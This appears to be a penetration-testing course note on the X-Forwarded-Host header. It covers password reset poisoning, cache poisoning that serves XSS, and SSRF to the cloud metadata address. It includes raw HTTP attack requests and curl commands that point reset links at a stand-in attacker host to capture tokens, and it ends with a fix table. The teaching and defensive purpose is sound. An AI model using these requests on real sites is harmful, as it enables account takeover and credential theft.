---
tags: [vapt, http-headers, web, intermediate]
difficulty: intermediate
module: "03 - HTTP Headers"
topic: "03.03 X-Forwarded-Host — SSRF, Cache Poisoning"
---

# 03.03 — X-Forwarded-Host

## What is it?

`X-Forwarded-Host` tells the backend server the original `Host` header value that was sent by the client to the front-end proxy. It's used when a reverse proxy rewrites the `Host` header but the application needs to know the original domain for generating absolute URLs.

---

## How X-Forwarded-Host Is Used

```
CLIENT              FRONT-END PROXY              BACKEND
  │                       │                          │
  │ Host: target.com       │                          │
  │ ─────────────────────→│                          │
  │                       │ Host: internal-app:8080  │
  │                       │ X-Forwarded-Host: target.com
  │                       │ ──────────────────────────→
  │                       │                          │
  │                       │  Backend uses X-Forwarded-Host
  │                       │  to generate: https://target.com/reset?token=abc
```

---

## Attack 1: Password Reset Poisoning via X-Forwarded-Host

```
Many frameworks check X-Forwarded-Host BEFORE Host for URL generation.

ATTACK:
POST /forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com    ← app uses this for reset link!

Email sent to victim: "Reset your password: https://attacker.com/reset?token=SECRET"

Victim clicks → attacker captures token → account takeover!

This works even when Host header is validated, if X-Forwarded-Host is trusted first.
```

**PortSwigger Lab:** "Password reset poisoning via middleware"

---

## Attack 2: Cache Poisoning via X-Forwarded-Host

```
Step 1: Check if X-Forwarded-Host is reflected in response:
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com

Response:
<link rel="stylesheet" href="https://attacker.com/static/main.css">
↑ attacker.com reflected!

Step 2: Check if this response gets cached (X-Forwarded-Host not in cache key):
GET / HTTP/1.1
Host: target.com
← no X-Forwarded-Host this time

If response still shows attacker.com → CACHE POISONED for ALL users!

Step 3: Replace with malicious content:
Host to use: attacker.com (you control it)
Point attacker.com/static/main.css → JavaScript payload
→ XSS served to all cached visitors!
```

---

## Attack 3: SSRF via X-Forwarded-Host

```
If backend uses X-Forwarded-Host to construct server-side requests:

GET /api/proxy HTTP/1.1
Host: target.com
X-Forwarded-Host: 169.254.169.254   ← cloud metadata!

→ Backend fetches: http://169.254.169.254/
→ Returns cloud credentials!
```

---

## Testing

```bash
# Check if X-Forwarded-Host is reflected
curl -s https://target.com/ -H "X-Forwarded-Host: evil.com" | grep "evil.com"

# Check if used in password reset
curl -X POST https://target.com/forgot-password \
  -H "X-Forwarded-Host: attacker.com" \
  -d "email=victim@test.com"
# Monitor attacker.com for incoming requests with reset tokens

# Cache poisoning test
curl -s https://target.com/ -H "X-Forwarded-Host: canary-12345.test" | grep "canary"
# If found → reflection exists → potential cache poisoning
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| X-Forwarded-Host trusted for URL generation | Hardcode base URL in config |
| X-Forwarded-Host in cache key | Include all request-altering headers in cache key |
| SSRF via X-Forwarded-Host | Strip this header at the front-end proxy |

---

## Related Notes
- [[01 - Host Header]] — primary host injection vector
- [[02 - X-Forwarded-For]] — similar proxy forwarding header
- [[Module 10 - Web Cache Poisoning]] — cache poisoning via unkeyed headers
- [[Module 13 - SSRF]] — SSRF via proxy headers
